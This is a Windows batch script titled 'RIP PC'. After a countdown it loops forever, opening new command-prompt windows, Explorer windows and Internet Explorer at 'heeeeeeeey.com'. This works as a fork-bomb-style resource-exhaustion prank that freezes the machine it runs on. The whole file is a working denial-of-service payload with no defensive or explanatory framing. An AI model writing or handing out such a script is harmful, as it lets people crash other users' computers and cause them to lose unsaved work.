@echo off
title RIP PC
cls
echo STARTING IN 3..
timeout 1 >nul
cls
echo STARTING IN 2..
timeout 1 >nul
cls
echo STARTING IN 1..
timeout 1 >nul
cls
echo STARTING..
timeout 3 >nul
:gohere
start cmd.exe
start explorer.exe
iexplore heeeeeeeey.com
timeout 0 >nul
goto gohere
